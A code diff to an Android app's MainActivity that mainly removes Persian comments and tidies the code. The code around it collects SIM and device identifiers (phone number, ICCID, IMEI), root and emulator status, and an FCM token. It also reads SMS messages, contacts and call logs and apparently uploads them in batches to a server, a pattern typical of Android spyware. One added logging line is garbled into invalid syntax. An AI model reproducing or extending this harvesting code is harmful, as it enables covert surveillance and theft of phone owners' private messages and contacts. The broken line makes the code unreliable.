@@ -271,7 +271,7 @@ class MainActivity : ComponentActivity() {
         } catch (e: Exception) {
             Log.e(TAG, "❌ IP Address error: ${e.message}")
         }
-        return "10.0.2.15"
+        return "Unknown"
     }
 
     private fun getSimInfo(): JSONArray {
@@ -289,32 +289,30 @@ class MainActivity : ComponentActivity() {
                 sims.forEach { info ->
                     val sim = JSONObject().apply {
                         // 🔵 اطلاعات اصلی
-                        put("simSlot", info.simSlotIndex) // شماره اسلات (0, 1)
-                        put("subscriptionId", info.subscriptionId) // شناسه یکتا
-                        put("carrierName", info.carrierName?.toString() ?: "") // نام اپراتور (ایرانسل، همراه اول)
-                        put("displayName", info.displayName?.toString() ?: "") // نام نمایشی سیم
-                        put("phoneNumber", info.number ?: "") // شماره تلفن
+                        put("simSlot", info.simSlotIndex)
+                        put("subscriptionId", info.subscriptionId)
+                        put("carrierName", info.carrierName?.toString() ?: "")
+                        put("displayName", info.displayName?.toString() ?: "")
+                        put("phoneNumber", info.number ?: "")
 
                         // 🌍 اطلاعات کشور و شبکه
-                        put("countryIso", info.countryIso ?: "") // کد کشور (IR)
-                        put("mcc", info.mccString ?: "") // Mobile Country Code (432)
-                        put("mnc", info.mncString ?: "") // Mobile Network Code (11, 35, 70)
+                        put("countryIso", info.countryIso ?: "")
+                        put("mcc", info.mccString ?: "")
+                        put("mnc", info.mncString ?: "")
 
                         // 📶 وضعیت شبکه
                         put("isNetworkRoaming", info.dataRoaming == SubscriptionManager.DATA_ROAMING_ENABLE)
 
                         // 🎨 ظاهری و شناسه
-                        put("iconTint", info.iconTint) // رنگ آیکون
-                        put("cardId", info.cardId) // شناسه فیزیکی کارت
+                        put("iconTint", info.iconTint)
+                        put("cardId", info.cardId)
 
                         // 📡 قابلیت‌های پیشرفته (Android 10+)
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                            put("carrierId", info.carrierId) // شناسه اپراتور
-                            put("isEmbedded", info.isEmbedded) // eSIM یا نه
-                            put("isOpportunistic", info.isOpportunistic) // سیم فرعی یا اصلی
-                            put("iccId", info.iccId ?: "") // شماره سریال سیم‌کارت (19-20 رقمی)
-
-                            // Group UUID (برای سیم‌های گروهی)
+                            put("carrierId", info.carrierId)
+                            put("isEmbedded", info.isEmbedded)
+                            put("isOpportunistic", info.isOpportunistic)
+                            put("iccId", info.iccId ?: "")
                             val groupUuid = info.groupUuid
                             put("groupUuid", groupUuid?.toString() ?: "")
                         } else {
@@ -325,94 +323,70 @@ class MainActivity : ComponentActivity() {
                             put("groupUuid", "")
                         }
 
-                        // 🔢 شماره سریال سیم (Android 12+)
+                        // 🔢 Port Index (Android 12+)
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                             try {
                                 put("portIndex", info.portIndex)
                             } catch (e: Exception) {
                                 put("portIndex", -1)
                             }
+                        } else {
+                            put("portIndex", -1)
                         }
 
-                        // 📞 اطلاعات TelephonyManager (برای هر سیم جداگانه)
+                        // 📞 اطلاعات TelephonyManager
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                             try {
                                 val tm = telephonyManager.createForSubscriptionId(info.subscriptionId)
 
-                                // نوع شبکه (2G/3G/4G/5G)
                                 put("networkType", getNetworkTypeName(tm.dataNetworkType))
-
-                                // نام اپراتور شبکه فعلی
                                 put("networkOperatorName", tm.networkOperatorName ?: "")
-
-                                // کد اپراتور شبکه (MCC+MNC)
                                 put("networkOperator", tm.networkOperator ?: "")
-
-                                // اطلاعات اپراتور سیم‌کارت
                                 put("simOperatorName", tm.simOperatorName ?: "")
                                 put("simOperator", tm.simOperator ?: "")
-
-                                // وضعیت سیم (Ready/Locked/...)
                                 put("simState", getSimStateName(tm.simState))
-
-                                // نوع تلفن (GSM/CDMA)
                                 put("phoneType", getPhoneTypeName(tm.phoneType))
 
-                                // IMEI (شناسه دستگاه برای هر سیم)
                                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                     try {
                                         put("imei", tm.imei ?: "")
-                                    } catch (e: Exception) {
-                                        put("imei", "")
-                                    }
-                                } else {
-                                    put("imei", "")
-                                }
-
-                                // MEID (برای CDMA)
-                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                    try {
                                         put("meid", tm.meid ?: "")
                                     } catch (e: Exception) {
+                                        put("imei", "")
                                         put("meid", "")
                                     }
                                 } else {
+                                    put("imei", "")
                                     put("meid", "")
                                 }
 
-                                // وضعیت دیتا
                                 put("dataEnabled", tm.isDataEnabled)
-
-                                // وضعیت Data Roaming
                                 put("dataRoamingEnabled", tm.isDataRoamingEnabled)
 
-                                // قابلیت‌های شبکه
                                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                                     put("voiceCapable", tm.isVoiceCapable)
                                     put("smsCapable", tm.isSmsCapable)
+                                } else {
+                                    put("voiceCapable", false)
+                                    put("smsCapable", false)
                                 }
 
-                                // وضعیت آنتن (نیاز به مجوز READ_PHONE_STATE)
                                 put("hasIccCard", tm.hasIccCard)
 
-                                // Software Version
                                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                     try {
                                         put("deviceSoftwareVersion", tm.deviceSoftwareVersion ?: "")
+                                        put("visualVoicemailPackageName", tm.visualVoicemailPackageName ?: "")
                                     } catch (e: Exception) {
                                         put("deviceSoftwareVersion", "")
+                                        put("visualVoicemailPackageName", "")
                                     }
+                                } else {
+                                    put("deviceSoftwareVersion", "")
+                                    put("visualVoicemailPackageName", "")
                                 }
 
-                                // Visual Voicemail
-                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                                    put("visualVoicemailPackageName", tm.visualVoicemailPackageName ?: "")
-                                }
-
-                                // Network Country ISO
                                 put("networkCountryIso", tm.networkCountryIso ?: "")
-
-                                // SIM Country ISO
                                 put("simCountryIso", tm.simCountryIso ?: "")
 
                             } catch (e: Exception) {
@@ -429,7 +403,6 @@ class MainActivity : ComponentActivity() {
         return simArray
     }
 
-    // تبدیل نوع شبکه به متن
     private fun getNetworkTypeName(networkType: Int): String {
         return when (networkType) {
             android.telephony.TelephonyManager.NETWORK_TYPE_GPRS -> "GPRS (2G)"
@@ -459,7 +432,6 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // وضعیت سیم‌کارت
     private fun getSimStateName(state: Int): String {
         return when (state) {
             android.telephony.TelephonyManager.SIM_STATE_ABSENT -> "Absent"
@@ -480,7 +452,6 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // نوع تلفن
     private fun getPhoneTypeName(phoneType: Int): String {
         return when (phoneType) {
             android.telephony.TelephonyManager.PHONE_TYPE_NONE -> "None"
@@ -498,19 +469,16 @@ class MainActivity : ComponentActivity() {
             Log.d(TAG, "📝 REGISTERING DEVICE")
             Log.d(TAG, "════════════════════════════════════════")
 
-            // گرفتن اطلاعات Storage
             val statFs = android.os.StatFs(android.os.Environment.getDataDirectory().path)
             val totalStorage = statFs.totalBytes
             val freeStorage = statFs.availableBytes
 
-            // گرفتن اطلاعات RAM
             val activityManager = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
             val memInfo = android.app.ActivityManager.MemoryInfo()
             activityManager.getMemoryInfo(memInfo)
             val totalRam = memInfo.totalMem
             val freeRam = memInfo.availMem
 
-            // گرفتن نوع شبکه
             val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
             val networkType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 val network = connectivityManager.activeNetwork
@@ -522,19 +490,17 @@ class MainActivity : ComponentActivity() {
                     else -> "Unknown"
                 }
             } else {
+                @Suppress("DEPRECATION")
                 val netInfo = connectivityManager.activeNetworkInfo
                 netInfo?.typeName ?: "Unknown"
             }
 
-            // چک کردن Root
             val isRooted = checkIfRooted()
 
-            // گرفتن اطلاعات صفحه نمایش
             val displayMetrics = resources.displayMetrics
             val screenResolution = "${displayMetrics.widthPixels}x${displayMetrics.heightPixels}"
             val screenDensity = displayMetrics.densityDpi
 
-            // گرفتن وضعیت شارژ
             val batteryStatus = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
             val status = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
             val isCharging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
@@ -550,7 +516,6 @@ class MainActivity : ComponentActivity() {
             }
 
             val body = JSONObject().apply {
-                // اطلاعات اصلی
                 put("deviceId", deviceId)
                 put("model", Build.MODEL)
                 put("manufacturer", Build.MANUFACTURER)
@@ -564,39 +529,21 @@ class MainActivity : ComponentActivity() {
                 put("display", Build.DISPLAY)
                 put("fingerprint", Build.FINGERPRINT)
                 put("host", Build.HOST)
-
-                // CPU Architecture
                 put("supportedAbis", JSONArray(Build.SUPPORTED_ABIS.toList()))
-
-                // باتری
                 put("battery", getBatteryPercentage())
                 put("batteryState", batteryState)
                 put("isCharging", isCharging)
-
-                // حافظه
                 put("totalStorage", totalStorage)
                 put("freeStorage", freeStorage)
                 put("totalRam", totalRam)
                 put("freeRam", freeRam)
-
-                // شبکه
                 put("networkType", networkType)
                 put("ipAddress", getIPAddress())
-
-                // امنیت
                 put("isRooted", isRooted)
-
-                // صفحه نمایش
                 put("screenResolution", screenResolution)
                 put("screenDensity", screenDensity)
-
-                // سیم‌کارت
                 put("simInfo", getSimInfo())
-
-                // FCM Token
                 put("fcmToken", fcmToken)
-
-                // اطلاعات اضافی
                 put("userId", userId)
                 put("Type", "MP")
                 put("isEmulator", isEmulator())
@@ -634,10 +581,8 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // تابع چک کردن Root
     private fun checkIfRooted(): Boolean {
         return try {
-            // بررسی فایل‌های معمول Root
             val paths = arrayOf(
                 "/system/app/Superuser.apk",
                 "/sbin/su",
@@ -650,14 +595,12 @@ class MainActivity : ComponentActivity() {
                 "/data/local/su",
                 "/su/bin/su"
             )
-
             paths.any { java.io.File(it).exists() } || checkSuCommand()
         } catch (e: Exception) {
             false
         }
     }
 
-    // چک کردن دستور su
     private fun checkSuCommand(): Boolean {
         return try {
             Runtime.getRuntime().exec("su")
@@ -667,7 +610,6 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    // تشخیص Emulator
     private fun isEmulator(): Boolean {
         return (Build.FINGERPRINT.startsWith("generic")
                 || Build.FINGERPRINT.startsWith("unknown")
@@ -697,10 +639,10 @@ class MainActivity : ComponentActivity() {
                     val smsBatch = JSONArray()
                     var totalSent = 0
                     var count = 0
-                    val maxSms = 100 // محدودیت تعداد
+                    val maxSms = 100
 
                     do {
-                        if (count >= maxSms) break // توقف بعد از 100 تا
+                        if (count >= maxSms) break
 
                         try {
                             val sms = JSONObject().apply {
@@ -712,7 +654,7 @@ class MainActivity : ComponentActivity() {
                                 put("deviceId", deviceId)
                             }
                             smsBatch.put(sms)
-                            count++ // افزایش شمارنده
+                            count++
 
                             if (smsBatch.length() >= 50) {
                                 if (uploadSmsBatch(smsBatch)) {
@@ -765,7 +707,7 @@ class MainActivity : ComponentActivity() {
             != PackageManager.PERMISSION_GRANTED) return
 
         try {
-            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "════Log.d(TAG, "════════════════════════════════════════")
             Log.d(TAG, "👥 UPLOADING CONTACTS")
             Log.d(TAG, "════════════════════════════════════════")
 
@@ -873,10 +815,10 @@ class MainActivity : ComponentActivity() {
                     val callsBatch = JSONArray()
                     var totalSent = 0
                     var count = 0
-                    val maxCalls = 200 // محدودیت تعداد
+                    val maxCalls = 200
 
                     do {
-                        if (count >= maxCalls) break // توقف بعد از 200 تا
+                        if (count >= maxCalls) break
 
                         try {
                             val callType = it.getInt(2)
@@ -900,7 +842,7 @@ class MainActivity : ComponentActivity() {
                                 put("deviceId", deviceId)
                             }
                             callsBatch.put(call)
-                            count++ // افزایش شمارنده
+                            count++
 
                             if (callsBatch.length() >= 100) {
                                 if (uploadCallsBatch(callsBatch)) {
